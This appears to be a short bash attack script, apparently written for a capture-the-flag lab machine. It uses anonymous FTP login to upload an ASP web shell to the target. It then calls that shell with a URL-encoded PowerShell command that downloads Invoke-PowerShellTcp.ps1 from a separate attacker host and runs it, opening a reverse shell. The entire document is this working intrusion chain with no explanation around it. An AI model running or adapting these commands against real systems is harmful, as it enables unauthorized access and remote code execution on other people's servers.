#!/bin/bash

FTP_SERVER="10.10.10.116"
FTP_USERNAME="anonymous"
FTP_PASSWORD="anonymous"
LOCAL_FILE="shell.asp"


lftp -u $FTP_USERNAME,$FTP_PASSWORD $FTP_SERVER <<EOF
put $LOCAL_FILE
bye
EOF

curl -s http://10.10.10.116/upload/shell.asp?cmd=powershell+iex+%28New-Object+Net.WebClient%29.DownloadString%28%27http%3A%2F%2F10.10.14.13%3A8000%2FInvoke-PowerShellTcp.ps1%27%29
